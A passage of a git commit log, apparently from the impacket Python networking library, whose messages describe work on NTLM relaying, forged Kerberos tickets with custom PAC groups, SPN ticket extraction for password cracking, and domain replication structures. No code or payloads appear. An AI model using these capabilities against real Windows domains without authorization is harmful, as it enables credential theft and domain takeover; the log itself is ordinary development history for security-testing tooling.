    added extensibleMatch string filter parsing

commit 427ad258cf45c767015ff0e92e7fe33aacecf780
Merge: d17cf6f5 01b77623
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 17 10:48:30 2016 -0300

    Merge branch 'kacpern-ldap-filter'

commit 01b776231ad7bdf1c1a801e93214caddd4a3078e
Merge: d17cf6f5 6989a3cb
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 17 09:19:59 2016 -0300

    Merge branch 'ldap-filter' of https://github.com/kacpern/impacket into kacpern-ldap-filter

commit 6989a3cb41e002233435c37417fbd50e6c2a7a9e
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 17 17:57:38 2016 +1000

    minor fix

commit b6f25451abb5e858cdeb34120b83089ae4784802
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 17 17:52:54 2016 +1000

    minor changes

commit 519bda4bf0b1a1721a9711e11ae9c80ebb742829
Merge: 92682d77 b1502a32
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 17 17:52:22 2016 +1000

    Merge remote-tracking branch 'origin/ldap-filter' into ldap-filter
    
    # Conflicts:
    #       impacket/ldap/ldap.py

commit 92682d777fae189d008fbc9fc130effe438af5fa
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 17 17:47:46 2016 +1000

    fixed 'not' filter

commit b1502a32738e6ed7ae76206d3b0146f832298c82
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 17 17:47:46 2016 +1000

    fixed 'not' filter

commit c4eda9d91e9ce07c15ab49905d13b3457e188ede
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 17 12:35:49 2016 +1000

    added parsing of ldap text filters into a Filter() object

commit d17cf6f587718c794afe229e10bbb72560fb1c79
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 12 23:09:57 2016 -0500

    Forgot to restore to its original state

commit f8ed7640afd74259fa5079a4db612e35a3bc5103
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 12 23:08:31 2016 -0500

    Minor cosmetic changes
    
    * Mainly variable renaming so it's easier to understand their meaning
    * Further testing is needed since I can't make it work the attack part. It gets stuck when searching the target LDAP

commit bf4dc4f6ed28e16727a283582e2ba7cf714a5392
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 12 11:10:50 2016 -0700

    Adding -duration parameter
    
    * By default ticket is valid for 10 years, you can change that now

commit 90a91045139659d83409af1771dcaf697c00de99
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 11 21:29:40 2016 -0700

    Whenever there's an exception triggered when searching the PEK we skip the row
    
    * Hopefully addresses a privately reported issue

commit 8c45d98bba08503088405c00cde9f2dc1f30d5a7
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 11 21:24:02 2016 -0700

    Adding MSSQLAttack() class.
    
    * Now you can specify a SQL statement to be executed after a successful relay is done
    * Addresses a part of https://github.com/CoreSecurity/impacket/issues/188

commit a37d352c0b7fc2fd416d2723f84400a05498bf4f
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 10 22:27:52 2016 -0700

    Customizing some code

commit 4a10ef4603308ce1bc1d9b9cf7d1fb7eb14a86d4
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 10 19:56:52 2016 -0700

    Removing -save option. Saves ticket to disk by default
    
    * Can't find a use case where we would not want this

commit 007c50e871bd55c2e029fa507247404ede5a8415
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 10 19:50:36 2016 -0700

    Adding help examples

commit 5812bee6f60b1cf4aecad46d304c197ef7e7b051
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 10 19:22:18 2016 -0700

    This script will create TGT/TGS tickets from scratch or based on a template (legally requested from the KDC)
    allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the
    groups, extrasids, etc.
    Tickets duration is fixed to 10 years from now (although you can manually change it)

commit bfeb31ab7eab58c3f47392b587b794d4d4ada783
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 7 23:19:22 2016 -0700

    Changing PAC_SIGNATURE_DATA['SignatureType'] type allowing negative numbers

commit fea99f7493030ec76b1b9cb260b715ba4b5bcd12
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 7 22:46:14 2016 -0700

    Adding [MS-KILE] 3.1.5.9 Key Usage Numbers constants

commit 053cb994d683d9cc8a4228a2662ab58e420fae2b
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 2 10:28:38 2016 -0300

    Removing PAC structures and using the ones located in the library
    
    * Now located at impacket.krb5.pac

commit 4e56a32350076759b03ffaa34fbdc541f8da7f5e
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 2 10:25:23 2016 -0300

    Adding [MS-PAC] implementation into the library
    
    * Too many examples already using it, simpler to have it in a single place

commit 5d6879242b46d06095694ff2cee891b2379311f0
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 2 09:42:02 2016 -0300

    Adding the enumerateMethods() helper function
    
    * If you pass a IDispatch derived interface, it will return a dictionary with the methods and parameters supported by the interface

commit 002d4c33ec94c22017ce7411bcefa00f94131b3c
Author: asolino <bethus@gmail.com>
Date:   Sat Jul 30 15:32:36 2016 -0300

    When a NDRUNION doesn't have any items we still need to return the bytes processed

commit 07723c6f124e087ea0c2f36ce18b3cbc568bf3b8
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 28 15:20:48 2016 -0300

    Adding HKEY_CLASSES_ROOT query support

commit 5a3ae389099a046ffc93daf657ec4e2499636e59
Merge: 801a54a6 6b579a48
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jul 27 09:06:03 2016 -0300

    Merge pull request #185 from real-datagram/master
    
    139 support added (lookupsid)

commit 6b579a488a98fda670c249741ea0c3a7e58dc261
Author: dg <datagram.locks@gmail.com>
Date:   Tue Jul 26 15:41:31 2016 -0700

    139 support added

commit 801a54a6aa94ec32fc38422dc516875cb6e8fae0
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 26 16:03:34 2016 -0300

    Fixed typo

commit a50fdda283f6e4bf906a2076d191ab870869c9a5
Merge: 4a261022 01cb24da
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jul 26 15:57:03 2016 -0300

    Merge pull request #184 from real-datagram/master
    
    port 139 updates and SMBTransport rewrite (samrdump)

commit 01cb24da0e815e894c3b7953319a8ae81bce24cc
Author: dg <datagram.locks@gmail.com>
Date:   Mon Jul 25 17:21:20 2016 -0700

    removed extra comments

commit 2bc0b7aaa4b29c806eb2f6c185e8ab6e4fa384bd
Author: dg <datagram.locks@gmail.com>
Date:   Mon Jul 25 17:19:38 2016 -0700

    139 support added

commit ed0a6a4ada866277dfef6d3f1d9bd7f7ef082c0a
Author: dg <datagram.locks@gmail.com>
Date:   Mon Jul 25 16:12:03 2016 -0700

    tab vs spaces typo

commit 75344b0c74a59204fdfd21064b6f2986d8ae5db0
Author: dg <datagram.locks@gmail.com>
Date:   Mon Jul 25 16:08:54 2016 -0700

    port 139 updates and SMBTransport call to generic DCERPCTransportFactory constructor

commit 4a261022f078983c6d016a23c545dad803764877
Merge: c7f66e67 3c1959ce
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jul 25 17:04:17 2016 -0300

    Merge pull request #182 from real-datagram/master
    
    added port 139 support and related options (smbexec)

commit 3c1959ceda0c00e402820fd875cd9e3515d87686
Author: dg <datagram.locks@gmail.com>
Date:   Mon Jul 25 12:36:33 2016 -0700

    added port 139 support and related options

commit c7f66e6793a4a99b70fd0ac2155b7022b5ad8c10
Merge: ee30e662 5835f61c
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 19 14:50:47 2016 -0300

    Merge branch 'real-datagram-master'

commit 5835f61c2d7d7e630c95ea1614d088d12fae9b18
Author: dg <datagram.locks@gmail.com>
Date:   Tue Jul 19 10:13:27 2016 -0700

    added port 139 support and related options

commit ee30e662d3189f239cde8491d18eda39a53e815c
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 18 14:02:40 2016 -0300

    Fixing typo

commit 4f792fb9f1457af302727a06da783208562fb25f
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 18 13:58:23 2016 -0300

    Adding -request-user parameter
    
    * Requests TGS for the SPN associated to the user specified (just the username, no domain needed)
    * Hopefully addresses https://github.com/CoreSecurity/impacket/issues/178

commit 7c144867073a279d3e2c6fb878383d1d16c8b97b
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 18 12:15:33 2016 -0300

    Replacing ':' for other character when building the JtR output
    
    * If we don't replace ':' JtR gets confused.
    * Hopefully addresses https://github.com/CoreSecurity/impacket/issues/179

commit 5ae1231c4d4a01492484d3f2c9ad0dc068fd066f
Author: asolino <bethus@gmail.com>
Date:   Sun Jul 17 19:37:46 2016 -0300

    Adding query -ve parameter
    
    * Queries for the default value or empty value name
    * Some code correction

commit 24c4921a2d7051b9d9cff76ef03f6074a347e572
Author: asolino <bethus@gmail.com>
Date:   Sun Jul 17 18:34:03 2016 -0300

    Minor fix in name_registration_request and updated test cases

commit e351505837d7d8547f9754628c9d8eee296d9eba
Author: asolino <bethus@gmail.com>
Date:   Sun Jul 17 17:40:00 2016 -0300

    NetBIOSError exception redefined, added name_query_request()

commit f73a97ee81a318bc2f6ccf24bffac76a4089143b
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 13 18:33:08 2016 -0300

    Adding test case for nmb.py

commit 0808e45b796741aea4162bd756e3f54522e8045b
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 13 18:26:27 2016 -0300

    Renaming and recoding of some classes + test case suite
    
    * Many changes to many classes. Much needed for a long time. Aiming at simplifying its work and addding Structure whenever possible.
    * Most probably will break backward compatibility for those using impacket.nmb.

commit d15d01c2fa8c5a0201a121215b7413b7b90a2358
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 8 22:04:41 2016 -0300

    Bugfixes
    
    * Changing logic for __print_all_subkeys_and_entries() method
    * Striping NULL character when printing lpNameOut
    * Better error control when an exception is triggered

commit 91aab87e135806427ae9e7aabda98535542a6437
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 8 21:03:14 2016 -0300

    Changing default value for hBaseRegEnumValue
    
    * Also optimizing the way we craft the packet to minimize trafic
    * Raising exception if trying more than once with the modified size received from the server

commit 04310006e4641c305642c25d48f4ca45f5c1e560
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 6 22:01:29 2016 -0300

    Restoring the right order in enableRegistry() and adding a warning message
    
    * In case we cannot check the RemoteRegistry status. We'll continue and hope for the best

commit 1a29f0ae3c0098d4f5b5b22b900549f05512e133
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 6 21:14:55 2016 -0300

    Fixed bug where KeyName wasn't printed correctly when -s switch used

commit f27c39da235ae23ac50af3cb92ca5bb1adef3915
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 6 20:58:01 2016 -0300

    Continuing if there are keys that cannot be opened

commit e08966ef10edcf696137280c938c6b934a42018b
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 6 20:36:30 2016 -0300

    Continuing if we cannot connect to SCMR to check RemoteRegistry state
    
    * Maybe a low level user connecting? :-o!

commit b2413d25a50a5d5c09c8c8317d069c092178785e
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 6 20:12:38 2016 -0300

    Setting socket timeout when connecting a new NetBIOSTCPSession
    
    * After connect(), we're restoring the previous timeout (should be None most of the times) because we handle timeouts later in a different way
    * Addresses https://github.com/CoreSecurity/impacket/issues/173

commit e8764446b54193292cc88973ba7965eea5c945f8
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 6 09:36:46 2016 -0300

    Making sure we return an ascii encoded string after performing first and second level encoding.
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/172#issuecomment-230631476

commit f04398f2e331330cc18e97208e0ae5bb639252c1
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 6 09:01:44 2016 -0300

    If SMBConnection times out, reconnect it

commit f8c19620ea0685421a5400d7869e20d196d0682c
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 5 20:22:01 2016 -0300

    Adding SMBConnection.reconnect() capability
    
    * reconnects the SMB object based on the original options and credentials used. Only exception is that
      manualNegotiate will not be honored.
      Not only the connection will be created but also a login attempt using the original credentials and
      method (Kerberos, PtH, etc)

commit 103ea978fa6d580367f42aca6aae2678c5cbefa0
Merge: b13acf3e d246ae57
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jul 5 11:47:40 2016 -0300

    Merge pull request #175 from fox-it/ntlmrelay-fixes
    
    ntlmrelayx bugfixes

commit d246ae5751721dc71b89c944e4345e6d723b9015
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Jul 5 16:36:13 2016 +0200

    ntlmrelayx bugfixes

commit b13acf3e64a8cef11537f6e6820ce5221b93069d
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 4 19:10:59 2016 -0300

    Automatically enables/starts/stops/disables the RemoteRegistry service when needed
    
    * Also part of https://github.com/CoreSecurity/impacket/issues/127 requests
    * Commented actions yet not implemented

commit e5c4bdaa04d8bc474f35186f78a06fca32d311b0
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 4 18:43:10 2016 -0300

    We remove the session resume file if ERROR_DS_DRA_BAD_DN error was triggered

commit 75167141137133248276f5458dc8d86ad10d2b8c
Merge: 5acf2b45 4e3ebc43
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 4 15:48:30 2016 -0300

    Merge branch 'manuporto-master'

commit 4e3ebc43c09d0b4b07c89429234e4c54ff991b67
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 4 15:47:05 2016 -0300

    Minor cosmetic changes
    
    * Copyright notices
    * Variable renamings
    * Reusing library code
    * minor logic flow changed

commit 421d390555d89fd86fc4a8b0084321d3c3cff917
Merge: 5acf2b45 e950f158
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 4 13:19:18 2016 -0300

    Merge branch 'master' of https://github.com/manuporto/impacket into manuporto-master

commit 5acf2b4579ff0a19c4115eaa0b489557ac3e9f62
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 16:29:20 2016 -0300

    Adding debug logging output for the exception

commit d824905276dfd2a1863e82136b5eed9fd6ba20cd
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 16:28:56 2016 -0300

    Undoing an unnecessary change

commit 267ee5e0657b29fe8b3c05160b3e27365fafe572
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 16:07:33 2016 -0300

    Adding -port parameter to support 445/tcp and 139/tcp as destination ports
    
    * I create a new parameters group called 'connection' where you can specify the destination port, the domain controller IP and the target IP (if needed)
    * We should propagate the same schema over the rest of the scripts (whenever applicable)
    * Aiming at addressing https://github.com/CoreSecurity/impacket/issues/172

commit fe705da38e1448819ecd83762cd979950e5e8468
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 15:57:25 2016 -0300

    Improving support for connections using NETBIOS_SESSION_PORT as target port
    
    * We're trying to honor the remoteName whenever possible.
    * If user asked for *SMBSERVER as the target name, the library will try to find the target's netbios name on its own.
    * Could potentially bring some incompatibilities with previous implementations, so please test this as much as possible
    * Aiming at addressing https://github.com/CoreSecurity/impacket/issues/172

commit 833943d26d76999a612a1cf38e4cfc26a8ad20d3
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 12:33:14 2016 -0300

    Adding Called Name when NETBIOS_SESSION_NEGATIVE_RESPONSE is raised

commit 7fbfde35dfd1ddccf520060977e5ba452d19cf36
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 12:24:13 2016 -0300

    Adding getRemoteName() method.
    
    * This is what the user specified when creating the SMBConnection object.

commit ef2ed82977ac746fe44ac19356f9c923d3d67215
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 12:22:46 2016 -0300

    Renaming get_dip() for getRemoteHost()
    
    * Why? Because not always the target is a IP address

commit 0b71f6532b0f448278b8049e860921ed2088055b
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 11:05:48 2016 -0300

    Adding more UUIDs based on updated protocol standards

commit ebd9fa4cb01b844984abb63e3fd272b9fc14773d
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 1 10:43:27 2016 -0300

    Simplifying dynamic imports
    
    * Used when building a RPC Reponse
    * Hopefully addresses https://github.com/CoreSecurity/impacket/issues/126 (I couldn't reproduce it)

commit 20b661efd234973a560b71d6743f47800f2a3c3f
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 28 14:29:12 2016 -0300

    And now coming back to dev :)

commit 7b0bfb763e80e6cc3f1bbc902ccc3fbcfad1b5d8
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 28 14:20:27 2016 -0300

    About to tag new version 0.9.15

commit 0481f3356c8c4ce9deccc0be2d718d11404b97c1
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 27 13:45:29 2016 -0300

    Forgot to set the tag for SubstringFilter
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/170

commit c3f8d9a7d58146093ca6fc08526b42951401c905
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 27 13:44:19 2016 -0300

    Don't fill up the attributes item if there are no attributes asked

commit 014928c48e1bbeefae34163beab807f86b809ea7
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 24 15:49:20 2016 -0300

    Fixing imports
    
    * We don't like import *

commit e950f158f3e198bb561496d31fc70b83c86a661d
Author: mporto <mporto@fi.uba.ar>
Date:   Fri Jun 24 12:23:18 2016 -0300

    Typo

commit 6f999e5756b89b49de6079621f8490cbdad1fcac
Author: mporto <mporto@fi.uba.ar>
Date:   Fri Jun 24 12:20:43 2016 -0300

    Reg example with partial query functionality

commit 16a321228cabf577f4e74daa242373d425e4d3de
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 23 19:28:29 2016 -0300

    Adding changes for the upcoming version
    
    * We're tagging as soon as we verify https://github.com/CoreSecurity/impacket/issues/168

commit 84252ae98dec44141ab82561b72202988ff2e376
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 23 19:22:12 2016 -0300

    doAttack() now keeps a list of target successfully attacked
    
    * Then we read it in the main thread and decide whether or not to attack again based on the -one-shot parameter
    * Hopefully addresses https://github.com/CoreSecurity/impacket/issues/168

commit e9e639a267eb87aabe1f5fb7e2ce4481eaed5ec1
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 23 17:45:22 2016 -0300

    Flags2 adjustements to avoid some stacks from whining
    
    * mazel tov! :)

commit ccf9c2b4451bfe9244e62ef49d44d1b0f5c05c75
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 23 12:18:57 2016 -0300

    Automatically adjust buffer size for hBaseRegQueryValue

commit 66111c8271c318fa4032efb6d6634441664857d8
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 23 12:06:28 2016 -0300

    Automatically adjust buffer size for hBaseRegEnumValue
    
    * If the original one didn't wasn't large enough
    * If you know the size in advance, you can specify it through dataLen parameter
    * Adjusted test case to trigger this situation

commit 9aeee403ca3e40bfef91b9099f100e2e68fd09ed
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 21 15:36:31 2016 -0300

    Adding the actual SPN to the JtR output produced (and saved via -outputfile)
    
    * Now -outputfile automatically selects -request

commit d6c065a820dc3dd90cb1bf91bb81be22f8f93102
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 21 14:47:35 2016 -0300

    Adding exception handler when processing each record
    
    * Handling pwdLastSet if it was never changed (hopefully)

commit 60f9fa627b3553e0330cbe543571a9db9ef672f1
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 21 14:25:26 2016 -0300

    Whenever we receive sizeLimitExceeded exception, we still process what we've got
    
    * Will give you some results until we implement paged searches

commit 55d1f3ff27b527cc00f66281993002058f5568dc
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 21 10:06:41 2016 -0300

    Extra checks if login didn't succeed

commit ffe7e92afdd8395d24986781da5eca42b2b0b05d
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 21 09:57:29 2016 -0300

    We shouldn't process cipherText if it wasn't processed before
    
    * Hopefully addresses https://github.com/CoreSecurity/impacket/issues/167 although it needs to be verified

commit 33794acbfa73c33e436354f635fcc9f7ae0a887f
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 15 09:27:49 2016 -0300

    Removing unnecessary dependency package

commit acc7a046727ea81bb27fafcb90e95bb359eb5ad4
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 14 13:02:09 2016 -0300

    Using httplib instead of requests plus error fixings
    
    * httplib comes by default, much better than requiring another dependency
    * Removed debug messages
    * Fixed minor errors

commit a769fbca94a5c85ed58cb0e5650f2d621ed2c435
Merge: f618a5f1 adb01d65
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jun 14 10:53:26 2016 -0300

    Merge pull request #166 from fox-it/httprelayclient
    
    httprelayclient for ntlmrelayx

commit adb01d65df8315f9de6e09dfcc8cce6c5632b1a6
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Jun 14 11:10:02 2016 +0200

    Added optional path support to target specification, fixed port parsing

commit 467ad252d4701a9a4bb050b99f5d74c961d3fda8
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Jun 14 11:02:57 2016 +0200

    HTTP relay client

commit f618a5f1e10d5f893907ad85b65b3c8d759a3537
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 8 20:16:51 2016 -0300

    Setting DRSBind.dwExtCaps accordingly so Win2016 TP5 with PAM is happy about us
    
    * Plus any other possible thing
    * Fixes https://github.com/CoreSecurity/impacket/issues/165
    * Thanks @gentilkiwi and @MichaelGrafnetter for your input

commit dd557b9a79f535ffae0dc8bedc37a9b873a9b20e
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 5 19:09:22 2016 -0300

    Adding DRS_EXT_GETCHGREPLY_V9 as a possible DRSGetNCChanges answer
    
    * Now we access the structures for both _V6 and V9
    * We added we support this feature in DRSBind().dwflags
    * Addresses issue found by @MichaelGrafnetter (https://github.com/CoreSecurity/impacket/issues/165)
    * Still needs to be tested but don't have yet a TP 5 propery configured.

commit c5dd3b86f0d0c21636f23a6a6905e3a53092e53e
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 5 18:56:53 2016 -0300

    Adding also the flag to support _V9 replies
    
    * DRS_EXT_GETCHGREPLY_V9

commit 27ed488d2786b5c66d844237fe797b2167841681
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 5 18:49:59 2016 -0300

    Adding new structures added for 2016 TP5 PAM support
    
    * In particular DRS_MSG_GETCHGREPLY_V9 and everything that depends on it
    * This is needed for addressing https://github.com/CoreSecurity/impacket/issues/165 (also detailed here https://github.com/gentilkiwi/mimikatz/issues/47)

commit 04c66e588083dbcff855c1b476f0cdad98141435
Merge: 07f19817 7b2f9421
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 3 21:43:04 2016 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit 07f19817d6ca2a819265814b519d271c30657d5c
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 3 21:38:48 2016 -0300

    Adding one-shot parameter
    
    * After successful authentication, only execute the attack once for each target (per protocol)

commit 7b2f942121e15c690463e988e1f1e84ed07963d2
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue May 31 22:42:38 2016 -0300

    Update README.md

commit 1bdba4837425a9546380b0962649fa114140496c
Author: asolino <bethus@gmail.com>
Date:   Tue May 31 21:22:54 2016 -0300

    Adding -dc-ip option to examples
    
    * Allows to specifying the IP address for the DC/kdcHost
    * Collateral for https://github.com/CoreSecurity/impacket/issues/160

commit 19f7fe90edfd4e651b63c14d8f125f17416fef2f
Author: asolino <bethus@gmail.com>
Date:   Tue May 31 21:15:16 2016 -0300

    Adding ability to specify kdcHost for DCERPC/DCOM layers
    
    * Adding kdcHost to the classes constructors (when applicable)
    * Through DCERPCTransport.set_kerberos() now you also can specify the kdcHost
    * Added DCERPCTransport.get_kdcHost() that will be used by DCOM and DCERPC
    * Aiming at addressing https://github.com/CoreSecurity/impacket/issues/160

commit cea19373434b808ae62d362af3bac360d2488ba8
Author: asolino <bethus@gmail.com>
Date:   Mon May 30 18:49:11 2016 -0300

    If ldap:// fails, we try ldaps://

commit a813b202ad45b990cd79bbd17dd9b4e8e7cf168f
Author: asolino <bethus@gmail.com>
Date:   Mon May 30 18:48:13 2016 -0300

    When setting a value, we pack it depending on the data type

commit c1cce7636cc7b201caa2a9bd8a71a33e4a3d17b1
Merge: d96a5370 0bb0b2bf
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 17:51:44 2016 -0300

    Merge branch 'fox-it-master'

commit 0bb0b2bf2843ea493223553f9542a4b971a6c327
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 17:47:33 2016 -0300

    More fixups and cosmetic changes

commit 5b31f9c26768552ff3effdbc139b62dcea219194
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 17:46:17 2016 -0300

    Forgot to change setup.py with new ntlmrelayx location

commit a1912824eb99ccf48b561d7ad716c92abf43aba3
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 17:44:28 2016 -0300

    Moving impacket.ntlmrelayx to impacket.examples.ntlmrelayx
    
    * Minor fixups in imports and cosmetic changes as well. There's some more code cleaning and variable naming left.

commit 8fa21746e4395b38664f5bbb4700357a95daf489
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 17:33:08 2016 -0300

    Imports fixups and minor cosmetic changes

commit 806ce6905a5c669300e8ce315ae1198242372151
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 17:13:21 2016 -0300

    Empty file

commit cd97e0f8226b819a76e67e822e2dc2320b9c595e
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 17:03:06 2016 -0300

    Fixed wrong structure sent to SMBClient preventing SMB Relay
    
    * Instead of rawtoken (didn't exist) it must be SPNEGO_token
    * Import fixups and minor cosmetic changes

commit c5c50bf2085d07b36b15af31e2187bd92a4ed68a
Merge: d96a5370 24dfd3a4
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 16:41:22 2016 -0300

    Merge branch 'master' of https://github.com/fox-it/impacket into fox-it-master

commit d96a537059e47131dd79ce05585a41e01aad3b13
Author: asolino <bethus@gmail.com>
Date:   Fri May 27 16:39:35 2016 -0300

    Adding lastLogon to the output as well

commit 24dfd3a4226469f37cd889bef90ba76bd3d60916
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Fri May 27 12:35:10 2016 +0200

    ntlmrelayx

commit 6ab19e5fbe6e4fd4f4c793c69b7bdb0ae887d1a9
Author: asolino <bethus@gmail.com>
Date:   Thu May 26 22:20:45 2016 -0300

    No need to close the SMB Connection

commit f5a053ac38f079787d6d65797d129cbb38286bf2
Author: asolino <bethus@gmail.com>
Date:   Thu May 26 22:17:39 2016 -0300

    Improving the LDAP search filter to minimize traffic
    
    * We're now asking for:
    (&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=UF_NORMAL_ACCOUNT)(!(UserAccountControl:1.2.840.113556.1.4.803:=UF_ACCOUNTDISABLE)))
    Basically will return the normal accounts, not expired, that has an SPN set.

commit 855561685eefa837c875ab7b45e6db0f1221cb4a
Author: asolino <bethus@gmail.com>
Date:   Thu May 26 22:10:32 2016 -0300

    Changing Kerberos auth mechanism from GSSAPI to GSS-SPNEGO plus minor fixed
    
    * Solves the issue of kerberosLogin still not working after pyasn1 upgrade (https://github.com/CoreSecurity/impacket/issues/162)
    * LDAP search accepts sizeLimit now
    * Better error descriptions
    * Fixed some LDAP ASN1 definitions

commit f978950f33e712459c0f08d07a98fbecb02096f8
Author: asolino <bethus@gmail.com>
Date:   Thu May 26 22:08:46 2016 -0300

    Socket more meaninful information when socket operation failed
    
    * Good for realizing there's a DNS resolve issue

commit 46bbd3ddee56ea39d3796e8581ae8eb01f631b88
Author: asolino <bethus@gmail.com>
Date:   Thu May 26 22:04:29 2016 -0300

    Parsing MSRPC_FAULT as probably response during bind() operation
    
    * Win 2012R2 sends MSRPC_FAULT instead of MSRPC_BINDNAK

commit 2408f3aed454f6c42a5ccb7b09526ef88941481d
Author: asolino <bethus@gmail.com>
Date:   Tue May 24 23:38:38 2016 -0300

    Making it work with pyasn1-0.1.8
    
    * kerberosLogin still doesn't work tho. Don't know exactly why
    * Partially address https://github.com/CoreSecurity/impacket/issues/162
    * Works with pyasn1-0.1.7 as well

commit a8576c017295b39915af1b2ff2874d19a3b83a77
Author: asolino <bethus@gmail.com>
Date:   Fri May 20 21:16:15 2016 -0300

    Reformatting some code

commit 0b1a28bfdd53466b9bed502a0740d6fe8aab8b6b
Merge: caf47e5f bc83d987
Author: asolino <bethus@gmail.com>
Date:   Fri May 20 16:24:37 2016 -0300

    Merge branch 'mgeeky-master'

commit bc83d9870f3d8e255a563cf481c9351730bf7542
Author: asolino <bethus@gmail.com>
Date:   Fri May 20 16:23:59 2016 -0300

    Using argparse choices to specify -s options

commit 4b81a6a4ed53621ae7322e6775538f9ab909f8e5
Author: asolino <bethus@gmail.com>
Date:   Fri May 20 16:14:50 2016 -0300

    No need to create the dictionaries with STATUS messages
    
    * We have them in nt_errors.ERROR_MESSAGES

commit d7bcae1c08a32e3bc4718f87ca440ba312754b12
Author: Mariusz B <mariusz.bit@gmail.com>
Date:   Wed May 18 18:35:26 2016 +0200

    Forgot to add default return status values in case setReturnStatus was not invoked.

commit 23e44f1869de5f04a23ba1c910f2179dd60b51e7
Author: mgeeky <mgeeky@users.noreply.github.com>
Date:   Wed May 18 17:44:03 2016 +0200

    Added logging of the status code returned to the connecting client.

commit b1af0b52cb54a5ecfb5968e5b69e83049f3846c9
